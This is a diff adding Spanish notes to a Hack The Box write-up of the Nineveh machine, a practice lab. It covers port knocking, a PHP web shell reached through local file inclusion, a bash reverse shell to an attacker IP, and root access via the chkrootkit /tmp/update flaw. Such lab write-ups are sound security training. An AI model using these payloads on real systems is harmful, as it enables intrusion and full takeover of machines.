@@ -161,13 +161,93 @@ Puedes ver procesos que existen en la maquina con
 
 ```
 /proc/sched_debug
+# Para ver una id_rsa
 
+/home/amrois/.ssh/id_rsa
 ```
 
 
+### knock.d
 
 
+![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/acd827d6-fe5f-43fd-874c-dae7b3dc4d8b)
 
 
+Este es el servicio que permite el port knocking si golpeas los puertos en un orden se abre o cierda un puerto
+
+```
+sudo apt install knockd  
+/etc/knockd.conf
+
+knockd 10.10.10.43 571:tcp 290:tcp 911:tcp
+```
+
+### Alternativo  (pero esta no es la manera buena de hacerlo)
+
+Encontramos el directorio /secure_notes/ y ahi vemos si hay algo interensante. Y ahi tenemos ya una clave privada ya que logramos abrir el puerto 22 pues ya te conectas (la clave privada estaba en la imagen).
+
+![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/abd7d041-ba3f-4519-9852-c25b348e3b84)
 
 
+Recuerda dale los permisos 600.
+
+Ahora vamos a crear una base de datos con extencion .php y con el LFI llamarlo.
+
+```
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/1d5e03b8-9aff-443a-b57a-f8fd1c7262b0)
+
+
+Recuerda poner %26 en lugar del & para que no de problemas
+```
+nineveh.htb/department/manage.php?notes=files/ninevehNotes../../../../../../../var/tmp/hack.php&cmd=bash -c "bash -i >&/dev/tcp/10.10.14.165/1234 0>&1"
+```
+
+Y listo tenemos la reverse shell. Algunas enumeraciones que se hicieron 
+
+```
+cat /etc/crontab
+### Para ver las tareas que se van a ejecutar en los proximo min
+
+systemctl list-timers
+```
+
+## Privilege Esca
+
+Con las herramientas para ver procesos vemos que se esta ejecutando el /usr/bin/chkrootkit. esto premite encontrar rootkits conocidos.
+
+```
+searchsploit chkrootkit
+```
+
+Esto tiene la vulnerabilidad de que ejecuta en /tmp update crea un script para hacer SUID la /bin/bash. Primero hacemo una full tty.
+
+```
+script /dev/null -c bash
+CTRL + Z
+#stty -echo raw;fg
+             reset
+xtem
+export TERM=xterm
+export SHELL=/bin/bash
+nano update
+
+
+#!/bin/bash
+
+chmod u+s /bin/bash
+```
+
+![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/130d1dd8-4c00-4437-8db0-c402a35011d5)
+
+Y para que veamos el contenido de manage.php el cual tenia un white list:
+
+![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/f29b3938-0ef0-4c19-ad3e-83e3b1a9ce8d)
+
+Que nos dice chatgtp
+
+![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/2d47477d-45b7-45b9-b7f5-a8e5ad5c6037)
+
+FIN
